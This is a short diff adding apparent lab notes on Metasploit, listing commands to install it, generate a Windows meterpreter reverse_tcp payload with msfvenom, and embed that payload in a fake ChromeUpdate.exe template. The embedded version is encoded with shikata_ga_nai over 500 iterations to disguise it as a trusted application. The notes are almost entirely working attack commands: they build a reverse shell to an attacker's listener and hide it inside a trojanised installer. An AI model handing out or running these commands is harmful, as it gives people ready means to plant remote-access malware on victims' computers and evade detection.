@@ -1,0 +1,19 @@
+o Note down Attacker IP address and Target IP address
+o Install Metasploit (if not installed) using command – ‘snap install metasploit-
+framework’
+o Initialize database- msfdb init
+o Launch Metasploit Console- msfconsole
+o Check database connection- db_status
+o Search Windows-based payloads- search platform:windows
+o Identify attacker ID (ifconfig) and Generate Payload- e.g. ‘ msfvenom --payload
+windows/meterpreter/reverse_tcp \ --arch x86 --format exe \ LHOST=192.168.0.28
+LPORT=4444 &gt; windowsMeterpreter.exe’ [LHost – Attacker IP, Lport- Listening
+port]
+o Payload can be embedded inside legitimate-looking executable-
+
+This disguises payload as a trusted application.
+“msfvenom --payload windows/meterpreter/reverse_tcp \
+--template /home/Downloads/ChromeUpdate.exe \
+--arch x86 --format exe \
+--encoding x86/shikata_ga_nai --iterations 500 \
+LHOST=10.0.2.15 LPORT=4444 &gt; windowsMeterpreter.exe”
